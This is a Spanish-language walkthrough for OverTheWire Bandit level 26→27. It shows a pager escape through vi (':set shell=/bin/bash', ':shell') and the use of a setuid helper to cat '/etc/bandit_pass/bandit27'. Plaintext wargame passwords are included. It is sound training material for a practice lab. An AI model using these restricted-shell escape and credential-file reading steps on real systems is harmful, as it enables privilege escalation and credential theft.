## Bandit Level 26 → Level 27

## Objetivo

Good job getting a shell! Now hurry and grab the password for bandit2

## Datos de acceso
 
**Servidor**:  bandit.labs.overthewire.org
**Usuario**: bandit26
**Password**: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

## Solución

```
  | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
--More--(50%)
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
:set shell=/bin/bash
:shell 
bandit26@bandit:~$ bandit26@bandit:~$ ls
bandit27-do  text.
bandit26@bandit:~$  ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$ 

```

## Notas adicionales

| Comando | Descripción |
|------------|-------------|
|  :set|  Permite establecer una variable   |
|:| Permite ejecutar un comando en v|
|:/| Permite ejecutar archivos|

El comando *vi* sirve para ejecutar comandos, dónde se establecen *set* la variable *shell* como /bin/bash  accediendo a la terminal con el usuario de *bandit26*.

## Referencias